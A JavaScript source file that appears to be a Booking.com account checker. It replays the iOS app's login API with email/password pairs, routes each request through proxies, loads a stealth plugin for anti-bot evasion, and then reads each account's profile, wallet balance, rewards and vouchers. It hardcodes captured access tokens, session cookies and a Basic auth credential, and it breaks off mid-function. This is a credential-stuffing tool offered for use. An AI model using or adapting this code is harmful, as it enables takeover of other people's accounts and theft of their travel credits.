const readlineSync = require('readline-sync');
const puppeteer = require("puppeteer-extra");
const pluginStealth = require("puppeteer-extra-plugin-stealth");
puppeteer.use(pluginStealth());
const fs = require('fs');
const delay = require('delay');
var no = 1;
var chalk = require('chalk');
var fetch = require('node-fetch');
const cluster = require('cluster');
var arguments = require('minimist')(process.argv.slice(2));
var cheerio = require('cheerio');
var random = require('random-name');
const config = require('./appconfig.json');
const setting = config.settings;
var machineIdSync = require('node-unique-machine-id');
const moment = require("moment-timezone");
var { HttpsProxyAgent } = require('https-proxy-agent');

function generateRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomString = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        randomString += characters[randomIndex];
    }
    return randomString;
}

function getCookie(deviceId) {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/context/initialize', {
            method: 'POST',
            headers: {
                'Host': 'account.booking.com',
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                //   'Content-Length': '193',
                //   'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
                'X-Booking-Iam-Access-Token': 'CAESggUSsAQIAhC7mN2VBRqlBIowZUT1P7pmmALUjaTNool-GDOB-iRNUH5-bN5fUzfKQc7Psm7xHs452ACAvD8OFfOlVY4uILId1HkJkW85t50E5mpqZvOMGN4cnfp0VmbRvK0X-Xi8TlTCwjBsRgMrSPstGJke-hHDlS1KqrbJZx13O2j2lpQQNmCSDwPf5NAXMVUP2jK2wOuP8qD40gQv8JYnwi2UiFXJzwlufNc1P78tkLt-7QJuxIPiV5aWvxLaOTVwXZ4hlSz6YHajPh3f8-JTKc_cLLSyk9MIHYKcE1ZNLW0wLmUWdNcVSL1YUu5hlZxQhYs-jurHI2pCR-nr8DeXaJ0JZx1GWXmgQ3vjKZwDtOOvI-WSHAXRSPo-IFPlWlXhaomPSQhUrVX9ZrhI7QVz1uw2Ak_GXiRQATYhK9jaGM2tiwms-3fRVZs14Z8F-ByF2B8I9POzTQ7008hfNZusik5QrC_wv2zDfyiya4OEsUk4U5CKrksCuL3Efziqb-chQwXISGTamkDz0lmqP21v5vNVmJKFMw3WXPfa0p5HnnFPbepcx0TFxWjUNp8jR7Gs22VdXeIzSY2rY7d8KsjVATZgbQd0t_y3DAThLQ_gyrpPOEI86mzV9hRFl0LgAAH0UoqvLoyK-lHrDkBevV1ylNqb92nRoxl3e7H1C2m0sYsESPkwKfe2I_XZyIej2fI_JObkKgzcIvXG7DSIXUHwq80wl1aHyEKbcKTKr4hrhnOKJBpAlF6_oj6TI4nZWfP8CkTtC-XCbA0DJ2DwYZmGTHvbCsZkdsGESW_IniKUJ6xM517oExOtFTMbkL6lz05ZhC17BiACKgEFMNzBkfAEOAE',
                'Dpop': 'eyJhbGciOiJlczI1NiIsImp3ayI6eyJjcnYiOiJQLTI1NiIsImt0eSI6IkVDIiwieCI6InBPTUZOQkNjV3VIc0dyeXd1YzdwNEVJZy1CZXhMM0VZbS1JRmJxQUNTanMiLCJ5IjoiVS0wODNQWktRbkdVQTdkd1dVd19ZM0ZtWWtvSHB2WF9pNlpKb0JtNXBrdyJ9LCJ0eXAiOiJkcG9wK2p3dCJ9.eyJodG0iOiJQT1NUIiwiaHR1IjoiXC9hcGlcL2lkZW50aXR5XC9hdXRoZW50aWNhdGVcL3YxLjBcL3NpZ25faW5cL3Bhc3N3b3JkXC9zdWJtaXQiLCJpYXQiOjE2OTY4OTUxMjIuNjkyNTk2OSwianRpIjoiRTlBNTZGRDAtNUEwNS00OEU2LTlBQjMtOENBMERCNzA1RTI1In0.0V_fqWdaoeLdmXWK5zvK3Hxgp7lul1V5vq4u1a-_uaIBXPYpx2IL3kGso9WED7ZoYsGktsXaYsFeofPglRlpTA',
                'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
            },
            body: JSON.stringify({
                'deviceContext': {
                    'deviceType': 'DEVICE_TYPE_IOS_NATIVE',
                    'deviceId': deviceId,
                    'libVersion': '1.2.6',
                    'lang': 'en-us',
                    'aid': '332731',
                    'oauthClientId': 'TyGLwEndlKhEGIR36zQm'
                }
            })
        })

        .then(async res => {
            const data = await res.json()
            var value = data.context.value;
            return value
        })
    return index
}

function fieldMail(email, deviceid) {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit', {
            method: 'POST',
            headers: {
                'Host': 'account.booking.com',
                'Content-Type': 'application/json',
                'X-Booking-Iam-Tsafs': '8820',
                'Accept': '*/*',
                'X-Booking-Iam-Access-Token': 'CAESggUSsAQIAhC7mN2VBRqlBIowZUT1P7pmmALUjaTNool-GDOB-iRNUH5-bN5fUzfKQc7Psm7xHs452ACAvD8OFfOlVY4uILId1HkJkW85t50E5mpqZvOMGN4cnfp0VmbRvK0X-Xi8TlTCwjBsRgMrSPstGJke-hHDlS1KqrbJZx13O2j2lpQQNmCSDwPf5NAXMVUP2jK2wOuP8qD40gQv8JYnwi2UiFXJzwlufNc1P78tkLt-7QJuxIPiV5aWvxLaOTVwXZ4hlSz6YHajPh3f8-JTKc_cLLSyk9MIHYKcE1ZNLW0wLmUWdNcVSL1YUu5hlZxQhYs-jurHI2pCR-nr8DeXaJ0JZx1GWXmgQ3vjKZwDtOOvI-WSHAXRSPo-IFPlWlXhaomPSQhUrVX9ZrhI7QVz1uw2Ak_GXiRQATYhK9jaGM2tiwms-3fRVZs14Z8F-ByF2B8I9POzTQ7008hfNZusik5QrC_wv2zDfyiya4OEsUk4U5CKrksCuL3Efziqb-chQwXISGTamkDz0lmqP21v5vNVmJKFMw3WXPfa0p5HnnFPbepcx0TFxWjUNp8jR7Gs22VdXeIzSY2rY7d8KsjVATZgbQd0t_y3DAThLQ_gyrpPOEI86mzV9hRFl0LgAAH0UoqvLoyK-lHrDkBevV1ylNqb92nRoxl3e7H1C2m0sYsESPkwKfe2I_XZyIej2fI_JObkKgzcIvXG7DSIXUHwq80wl1aHyEKbcKTKr4hrhnOKJBpAlF6_oj6TI4nZWfP8CkTtC-XCbA0DJ2DwYZmGTHvbCsZkdsGESW_IniKUJ6xM517oExOtFTMbkL6lz05ZhC17BiACKgEFMNzBkfAEOAE',
                'Dpop': 'eyJhbGciOiJlczI1NiIsImp3ayI6eyJjcnYiOiJQLTI1NiIsImt0eSI6IkVDIiwieCI6InBPTUZOQkNjV3VIc0dyeXd1YzdwNEVJZy1CZXhMM0VZbS1JRmJxQUNTanMiLCJ5IjoiVS0wODNQWktRbkdVQTdkd1dVd19ZM0ZtWWtvSHB2WF9pNlpKb0JtNXBrdyJ9LCJ0eXAiOiJkcG9wK2p3dCJ9.eyJodG0iOiJQT1NUIiwiaHR1IjoiXC9hcGlcL2lkZW50aXR5XC9hdXRoZW50aWNhdGVcL3YxLjBcL3NpZ25faW5cL3Bhc3N3b3JkXC9zdWJtaXQiLCJpYXQiOjE2OTY4OTUxMjIuNjkyNTk2OSwianRpIjoiRTlBNTZGRDAtNUEwNS00OEU2LTlBQjMtOENBMERCNzA1RTI1In0.0V_fqWdaoeLdmXWK5zvK3Hxgp7lul1V5vq4u1a-_uaIBXPYpx2IL3kGso9WED7ZoYsGktsXaYsFeofPglRlpTA',
                'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8',
                'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;'
            },
            body: JSON.stringify({
                // 'context': {
                //     'value': value
                // },
                'deviceContext': {
                    'deviceType': 'DEVICE_TYPE_IOS_NATIVE',
                    'deviceId': deviceid,
                    'libVersion': '1.2.6',
                    'lang': 'en-us',
                    'aid': '332731',
                    'oauthClientId': 'TyGLwEndlKhEGIR36zQm'
                },
                'identifier': {
                    'type': 'IDENTIFIER_TYPE__EMAIL',
                    'value': email
                }
            })
        })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

function fieldPassword(value, password, deviceid) {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit', {
            method: 'POST',
            headers: {
                'Host': 'account.booking.com',
                'Accept': '*/*',
                'Content-Type': 'application/json',
                //   'Content-Length': '480',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Booking-Iam-Access-Token': 'CAESggUSsAQIAhC7mN2VBRqlBIowZUT1P7pmmALUjaTNool-GDOB-iRNUH5-bN5fUzfKQc7Psm7xHs452ACAvD8OFfOlVY4uILId1HkJkW85t50E5mpqZvOMGN4cnfp0VmbRvK0X-Xi8TlTCwjBsRgMrSPstGJke-hHDlS1KqrbJZx13O2j2lpQQNmCSDwPf5NAXMVUP2jK2wOuP8qD40gQv8JYnwi2UiFXJzwlufNc1P78tkLt-7QJuxIPiV5aWvxLaOTVwXZ4hlSz6YHajPh3f8-JTKc_cLLSyk9MIHYKcE1ZNLW0wLmUWdNcVSL1YUu5hlZxQhYs-jurHI2pCR-nr8DeXaJ0JZx1GWXmgQ3vjKZwDtOOvI-WSHAXRSPo-IFPlWlXhaomPSQhUrVX9ZrhI7QVz1uw2Ak_GXiRQATYhK9jaGM2tiwms-3fRVZs14Z8F-ByF2B8I9POzTQ7008hfNZusik5QrC_wv2zDfyiya4OEsUk4U5CKrksCuL3Efziqb-chQwXISGTamkDz0lmqP21v5vNVmJKFMw3WXPfa0p5HnnFPbepcx0TFxWjUNp8jR7Gs22VdXeIzSY2rY7d8KsjVATZgbQd0t_y3DAThLQ_gyrpPOEI86mzV9hRFl0LgAAH0UoqvLoyK-lHrDkBevV1ylNqb92nRoxl3e7H1C2m0sYsESPkwKfe2I_XZyIej2fI_JObkKgzcIvXG7DSIXUHwq80wl1aHyEKbcKTKr4hrhnOKJBpAlF6_oj6TI4nZWfP8CkTtC-XCbA0DJ2DwYZmGTHvbCsZkdsGESW_IniKUJ6xM517oExOtFTMbkL6lz05ZhC17BiACKgEFMNzBkfAEOAE',
                // 'Dpop': 'eyJhbGciOiJlczI1NiIsImp3ayI6eyJjcnYiOiJQLTI1NiIsImt0eSI6IkVDIiwieCI6InBPTUZOQkNjV3VIc0dyeXd1YzdwNEVJZy1CZXhMM0VZbS1JRmJxQUNTanMiLCJ5IjoiVS0wODNQWktRbkdVQTdkd1dVd19ZM0ZtWWtvSHB2WF9pNlpKb0JtNXBrdyJ9LCJ0eXAiOiJkcG9wK2p3dCJ9.eyJodG0iOiJQT1NUIiwiaHR1IjoiXC9hcGlcL2lkZW50aXR5XC9hdXRoZW50aWNhdGVcL3YxLjBcL3NpZ25faW5cL3Bhc3N3b3JkXC9zdWJtaXQiLCJpYXQiOjE2OTY4OTUxMjIuNjkyNTk2OSwianRpIjoiRTlBNTZGRDAtNUEwNS00OEU2LTlBQjMtOENBMERCNzA1RTI1In0.0V_fqWdaoeLdmXWK5zvK3Hxgp7lul1V5vq4u1a-_uaIBXPYpx2IL3kGso9WED7ZoYsGktsXaYsFeofPglRlpTA',
                'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
            },
            body: JSON.stringify({
                'context': {
                    'value': value
                },
                'deviceContext': {
                    'deviceType': 'DEVICE_TYPE_IOS_NATIVE',
                    'deviceId': deviceid,
                    'libVersion': '1.2.6',
                    'lang': 'en-us',
                    'aid': '332731',
                    'oauthClientId': 'TyGLwEndlKhEGIR36zQm'
                },
                'authenticator': {
                    'type': 'AUTHENTICATOR_TYPE__PASSWORD',
                    'value': password
                }
            })
        })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

function profileinfo(token) {
    var index = fetch('https://mobile-apps.booking.com/json/mobile.getGeniusInfo?affiliate_id=332731&device_id=509ef8beface40529b00202e17350ba8&languagecode=en-us&network_type=wifi&return_only=amazon_campaign%2Cindex_benefits_carousel&user_os=16.6.1&user_version=41.2.3-iphone', {
        headers: {
          'Host': 'mobile-apps.booking.com',
          'Authorization': 'Basic d3pQTXpMeU5lI1p2cFBwMTpCMjA5cld0M2FoQiRueDNh',
          'Accept': '*/*',
          'X-Booking-Api-Version': '1',
          'B-S': '2,9682ffe64a591128f87a952f7672b9a3998ba435',
          'Accept-Language': 'en-us',
          'Accept-Encoding': 'gzip, deflate, br',
          'X-Booking-Iam-Access-Token': token,
          'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;'
        }
      })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

function checkReward(token) {
    var index = fetch('https://mobile-apps.booking.com/json/mobile.dml?affiliate_id=332731&device_id=509ef8beface40529b00202e17350ba8&languagecode=en-us&network_type=wifi&user_os=16.6.1&user_version=41.2.3-iphone', {
        method: 'POST',
        headers: {
          'Host': 'mobile-apps.booking.com',
          'Content-Type': 'application/x-gzip; contains="application/json"',
          'Apollographql-Client-Version': '41.2.3-41.2.3.14726470',
          'X-Booking-Api-Version': '1',
          'Content-Encoding': 'gzip',
          'B-S': '2,c98a69e4b39e084bb7b200ca10ccd51e5c9dfc11',
          'Authorization': 'Basic d3pQTXpMeU5lI1p2cFBwMTpCMjA5cld0M2FoQiRueDNh',
          'Accept': '*/*',
          'Accept-Language': 'en-us',
          'Accept-Encoding': 'gzip, deflate, br',
          'X-Booking-Iam-Access-Token': token,
          'Content-Length': '450',
          'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;',
          'X-Apollo-Operation-Type': 'query',
          'Apollographql-Client-Name': 'com.booking.BookingApp-apollo-ios',
          'X-Apollo-Operation-Name': 'RewardsAndWalletHome',
        //   'Cookie': '_pxhd=JiIH0i21OnAZ%2FMxVrRv4BwVG9%2FcAmmg4dFxga%2FNh4tcvukm28j%2FK8Bi45UJ031cZvnkn50YpPjUBNoDLDJmLCw%3D%3D%3AAQSkb3JpWWHoHqHEfEezgwQMX%2FV6AJLsMcfIL4n0ltC8y27C7mhypcxEH2O7iv8C4NyUlqIuAS1hBtk-lLDUZP3qDLRVUrXqRByAyy3vV6s%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
        },
        body: JSON.stringify({"operationName":"WalletBalance","variables":{},"query":"query WalletBalance { walletSummary { balance { credits { total { raw prettified currency } cash { raw prettified currency } } rewards { upcoming { monetary { count amount { prettified } } nonMonetary { count items { type title count } } } } vouchers { count amount { prettified } } spendable { prettified raw currency } } attributes { hasWallet hasReceivedVouchers walletStatus { isDisabled } } } walletBookLinks { spendRewardLinks { title description imageUrl link { deepLink href } } } walletFeaturedOffers { type title description iconUrl cta { title link { deepLink href } } } walletExplanationWidget { items { title description asset { assetName setName } } cta { title link { href } } } walletNotifications { id title description isDismissable type position icon { category name } displayConfig { check maxTimes } cta { title link { deepLink href to type } } } }"})
    })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

function getCookieProxy(deviceId, proxy) {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/context/initialize', {
            method: 'POST',
            agent: new HttpsProxyAgent(`http://${proxy}`),
            headers: {
                'Host': 'account.booking.com',
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                //   'Content-Length': '193',
                //   'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
                'X-Booking-Iam-Access-Token': 'CAESggUSsAQIAhC7mN2VBRqlBIowZUT1P7pmmALUjaTNool-GDOB-iRNUH5-bN5fUzfKQc7Psm7xHs452ACAvD8OFfOlVY4uILId1HkJkW85t50E5mpqZvOMGN4cnfp0VmbRvK0X-Xi8TlTCwjBsRgMrSPstGJke-hHDlS1KqrbJZx13O2j2lpQQNmCSDwPf5NAXMVUP2jK2wOuP8qD40gQv8JYnwi2UiFXJzwlufNc1P78tkLt-7QJuxIPiV5aWvxLaOTVwXZ4hlSz6YHajPh3f8-JTKc_cLLSyk9MIHYKcE1ZNLW0wLmUWdNcVSL1YUu5hlZxQhYs-jurHI2pCR-nr8DeXaJ0JZx1GWXmgQ3vjKZwDtOOvI-WSHAXRSPo-IFPlWlXhaomPSQhUrVX9ZrhI7QVz1uw2Ak_GXiRQATYhK9jaGM2tiwms-3fRVZs14Z8F-ByF2B8I9POzTQ7008hfNZusik5QrC_wv2zDfyiya4OEsUk4U5CKrksCuL3Efziqb-chQwXISGTamkDz0lmqP21v5vNVmJKFMw3WXPfa0p5HnnFPbepcx0TFxWjUNp8jR7Gs22VdXeIzSY2rY7d8KsjVATZgbQd0t_y3DAThLQ_gyrpPOEI86mzV9hRFl0LgAAH0UoqvLoyK-lHrDkBevV1ylNqb92nRoxl3e7H1C2m0sYsESPkwKfe2I_XZyIej2fI_JObkKgzcIvXG7DSIXUHwq80wl1aHyEKbcKTKr4hrhnOKJBpAlF6_oj6TI4nZWfP8CkTtC-XCbA0DJ2DwYZmGTHvbCsZkdsGESW_IniKUJ6xM517oExOtFTMbkL6lz05ZhC17BiACKgEFMNzBkfAEOAE',
                'Dpop': 'eyJhbGciOiJlczI1NiIsImp3ayI6eyJjcnYiOiJQLTI1NiIsImt0eSI6IkVDIiwieCI6InBPTUZOQkNjV3VIc0dyeXd1YzdwNEVJZy1CZXhMM0VZbS1JRmJxQUNTanMiLCJ5IjoiVS0wODNQWktRbkdVQTdkd1dVd19ZM0ZtWWtvSHB2WF9pNlpKb0JtNXBrdyJ9LCJ0eXAiOiJkcG9wK2p3dCJ9.eyJodG0iOiJQT1NUIiwiaHR1IjoiXC9hcGlcL2lkZW50aXR5XC9hdXRoZW50aWNhdGVcL3YxLjBcL3NpZ25faW5cL3Bhc3N3b3JkXC9zdWJtaXQiLCJpYXQiOjE2OTY4OTUxMjIuNjkyNTk2OSwianRpIjoiRTlBNTZGRDAtNUEwNS00OEU2LTlBQjMtOENBMERCNzA1RTI1In0.0V_fqWdaoeLdmXWK5zvK3Hxgp7lul1V5vq4u1a-_uaIBXPYpx2IL3kGso9WED7ZoYsGktsXaYsFeofPglRlpTA',
                'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
            },
            body: JSON.stringify({
                'deviceContext': {
                    'deviceType': 'DEVICE_TYPE_IOS_NATIVE',
                    'deviceId': deviceId,
                    'libVersion': '1.2.6',
                    'lang': 'en-us',
                    'aid': '332731',
                    'oauthClientId': 'TyGLwEndlKhEGIR36zQm'
                }
            })
        })

        .then(async res => {
            const data = await res.json()
            var value = data.context.value;
            return value
        })
    return index
}

function fieldMailProxy(email, deviceid, proxy) {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit', {
            method: 'POST',
            agent: new HttpsProxyAgent(`http://${proxy}`),
            headers: {
                'Host': 'account.booking.com',
                'Content-Type': 'application/json',
                'X-Booking-Iam-Tsafs': '8820',
                'Accept': '*/*',
                'X-Booking-Iam-Access-Token': 'CAESggUSsAQIAhC7mN2VBRqlBIowZUT1P7pmmALUjaTNool-GDOB-iRNUH5-bN5fUzfKQc7Psm7xHs452ACAvD8OFfOlVY4uILId1HkJkW85t50E5mpqZvOMGN4cnfp0VmbRvK0X-Xi8TlTCwjBsRgMrSPstGJke-hHDlS1KqrbJZx13O2j2lpQQNmCSDwPf5NAXMVUP2jK2wOuP8qD40gQv8JYnwi2UiFXJzwlufNc1P78tkLt-7QJuxIPiV5aWvxLaOTVwXZ4hlSz6YHajPh3f8-JTKc_cLLSyk9MIHYKcE1ZNLW0wLmUWdNcVSL1YUu5hlZxQhYs-jurHI2pCR-nr8DeXaJ0JZx1GWXmgQ3vjKZwDtOOvI-WSHAXRSPo-IFPlWlXhaomPSQhUrVX9ZrhI7QVz1uw2Ak_GXiRQATYhK9jaGM2tiwms-3fRVZs14Z8F-ByF2B8I9POzTQ7008hfNZusik5QrC_wv2zDfyiya4OEsUk4U5CKrksCuL3Efziqb-chQwXISGTamkDz0lmqP21v5vNVmJKFMw3WXPfa0p5HnnFPbepcx0TFxWjUNp8jR7Gs22VdXeIzSY2rY7d8KsjVATZgbQd0t_y3DAThLQ_gyrpPOEI86mzV9hRFl0LgAAH0UoqvLoyK-lHrDkBevV1ylNqb92nRoxl3e7H1C2m0sYsESPkwKfe2I_XZyIej2fI_JObkKgzcIvXG7DSIXUHwq80wl1aHyEKbcKTKr4hrhnOKJBpAlF6_oj6TI4nZWfP8CkTtC-XCbA0DJ2DwYZmGTHvbCsZkdsGESW_IniKUJ6xM517oExOtFTMbkL6lz05ZhC17BiACKgEFMNzBkfAEOAE',
                'Dpop': 'eyJhbGciOiJlczI1NiIsImp3ayI6eyJjcnYiOiJQLTI1NiIsImt0eSI6IkVDIiwieCI6InBPTUZOQkNjV3VIc0dyeXd1YzdwNEVJZy1CZXhMM0VZbS1JRmJxQUNTanMiLCJ5IjoiVS0wODNQWktRbkdVQTdkd1dVd19ZM0ZtWWtvSHB2WF9pNlpKb0JtNXBrdyJ9LCJ0eXAiOiJkcG9wK2p3dCJ9.eyJodG0iOiJQT1NUIiwiaHR1IjoiXC9hcGlcL2lkZW50aXR5XC9hdXRoZW50aWNhdGVcL3YxLjBcL3NpZ25faW5cL3Bhc3N3b3JkXC9zdWJtaXQiLCJpYXQiOjE2OTY4OTUxMjIuNjkyNTk2OSwianRpIjoiRTlBNTZGRDAtNUEwNS00OEU2LTlBQjMtOENBMERCNzA1RTI1In0.0V_fqWdaoeLdmXWK5zvK3Hxgp7lul1V5vq4u1a-_uaIBXPYpx2IL3kGso9WED7ZoYsGktsXaYsFeofPglRlpTA',
                'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8',
                'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;'
            },
            body: JSON.stringify({
                'deviceContext': {
                    'deviceType': 'DEVICE_TYPE_IOS_NATIVE',
                    'deviceId': deviceid,
                    'libVersion': '1.2.6',
                    'lang': 'en-us',
                    'aid': '332731',
                    'oauthClientId': 'TyGLwEndlKhEGIR36zQm'
                },
                'identifier': {
                    'type': 'IDENTIFIER_TYPE__EMAIL',
                    'value': email
                }
            })
        })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

function fieldPasswordProxy(value, password, deviceid, proxy) {
    var index = fetch('https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit', {
            method: 'POST',
            agent: new HttpsProxyAgent(`http://${proxy}`),
            headers: {
                'Host': 'account.booking.com',
                'Accept': '*/*',
                'Content-Type': 'application/json',
                //   'Content-Length': '480',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Booking-Iam-Access-Token': 'CAESggUSsAQIAhC7mN2VBRqlBIowZUT1P7pmmALUjaTNool-GDOB-iRNUH5-bN5fUzfKQc7Psm7xHs452ACAvD8OFfOlVY4uILId1HkJkW85t50E5mpqZvOMGN4cnfp0VmbRvK0X-Xi8TlTCwjBsRgMrSPstGJke-hHDlS1KqrbJZx13O2j2lpQQNmCSDwPf5NAXMVUP2jK2wOuP8qD40gQv8JYnwi2UiFXJzwlufNc1P78tkLt-7QJuxIPiV5aWvxLaOTVwXZ4hlSz6YHajPh3f8-JTKc_cLLSyk9MIHYKcE1ZNLW0wLmUWdNcVSL1YUu5hlZxQhYs-jurHI2pCR-nr8DeXaJ0JZx1GWXmgQ3vjKZwDtOOvI-WSHAXRSPo-IFPlWlXhaomPSQhUrVX9ZrhI7QVz1uw2Ak_GXiRQATYhK9jaGM2tiwms-3fRVZs14Z8F-ByF2B8I9POzTQ7008hfNZusik5QrC_wv2zDfyiya4OEsUk4U5CKrksCuL3Efziqb-chQwXISGTamkDz0lmqP21v5vNVmJKFMw3WXPfa0p5HnnFPbepcx0TFxWjUNp8jR7Gs22VdXeIzSY2rY7d8KsjVATZgbQd0t_y3DAThLQ_gyrpPOEI86mzV9hRFl0LgAAH0UoqvLoyK-lHrDkBevV1ylNqb92nRoxl3e7H1C2m0sYsESPkwKfe2I_XZyIej2fI_JObkKgzcIvXG7DSIXUHwq80wl1aHyEKbcKTKr4hrhnOKJBpAlF6_oj6TI4nZWfP8CkTtC-XCbA0DJ2DwYZmGTHvbCsZkdsGESW_IniKUJ6xM517oExOtFTMbkL6lz05ZhC17BiACKgEFMNzBkfAEOAE',
                // 'Dpop': 'eyJhbGciOiJlczI1NiIsImp3ayI6eyJjcnYiOiJQLTI1NiIsImt0eSI6IkVDIiwieCI6InBPTUZOQkNjV3VIc0dyeXd1YzdwNEVJZy1CZXhMM0VZbS1JRmJxQUNTanMiLCJ5IjoiVS0wODNQWktRbkdVQTdkd1dVd19ZM0ZtWWtvSHB2WF9pNlpKb0JtNXBrdyJ9LCJ0eXAiOiJkcG9wK2p3dCJ9.eyJodG0iOiJQT1NUIiwiaHR1IjoiXC9hcGlcL2lkZW50aXR5XC9hdXRoZW50aWNhdGVcL3YxLjBcL3NpZ25faW5cL3Bhc3N3b3JkXC9zdWJtaXQiLCJpYXQiOjE2OTY4OTUxMjIuNjkyNTk2OSwianRpIjoiRTlBNTZGRDAtNUEwNS00OEU2LTlBQjMtOENBMERCNzA1RTI1In0.0V_fqWdaoeLdmXWK5zvK3Hxgp7lul1V5vq4u1a-_uaIBXPYpx2IL3kGso9WED7ZoYsGktsXaYsFeofPglRlpTA',
                'Cookie': '_pxhd=5dvARpE9Tjk8fC0WmmeUxx4lgJ%2F0YjULRzwt1AD454HcZZMZ8QdIiNeU597Dhb2EVoo1ql0-yH5YjkiEk7YLpg%3D%3D%3A%2FnN1tcnM0sbdtchhWxw6q3JiRtgGmjp5pEPxFFq5typiSs48mJc4vCrMWMtN3LdzYW%2F5z%2FUinNPNM-ch1JeefO51CR0xYKIR6u9qclY9FTM%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
            },
            body: JSON.stringify({
                'context': {
                    'value': value
                },
                'deviceContext': {
                    'deviceType': 'DEVICE_TYPE_IOS_NATIVE',
                    'deviceId': deviceid,
                    'libVersion': '1.2.6',
                    'lang': 'en-us',
                    'aid': '332731',
                    'oauthClientId': 'TyGLwEndlKhEGIR36zQm'
                },
                'authenticator': {
                    'type': 'AUTHENTICATOR_TYPE__PASSWORD',
                    'value': password
                }
            })
        })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

function profileinfoProxy(token, proxy) {
